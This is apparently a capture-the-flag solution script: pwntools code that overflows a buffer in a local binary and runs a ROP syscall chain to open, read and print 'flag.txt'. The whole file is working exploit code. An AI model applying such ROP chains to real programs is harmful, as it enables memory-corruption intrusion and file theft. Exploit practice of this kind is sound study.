from pwn import *
from time import sleep

elf = ELF("./vuln")
context.arch = "amd64"
#context.terminal = "cmd.exe /c wt.exe -- wsl.exe -d Ubuntu -- ".split()
p = process("./vuln")
#p = gdb.debug("./vuln", gdbscript="b *0x402068\ncontinue")
context.log_level = "debug"


pop_rax = 0x469407
pop_rdi = 0x4018ea
pop_rsi = 0x402e08
pop_rdx = 0x4017ef
syscall = 0x435844
#push_rax = 0x41976c

payload = flat([
    b"A"*18,
    pop_rax, 0,
    pop_rdi, 0,
    pop_rsi, elf.bss(0x10),
    pop_rdx, 8,
    syscall,

    pop_rax, 2,
    pop_rdi, elf.bss(0x10),
    pop_rsi, 4,
    pop_rdx, 0,
    syscall,

    pop_rax, 0,
    pop_rdi, 3,
    pop_rsi, elf.bss(0x50),
    pop_rdx, 20,
    syscall,

    pop_rax, 1,
    pop_rdi, 1,
    pop_rdx, 20,
    syscall
    ])

p.sendlineafter(b"&\n", b"A")
#gdb.attach(p)
p.sendlineafter(b"burritos\n", payload)
sleep(2)
p.sendline(b"flag.txt")
#gdb.attach(p)
p.interactive()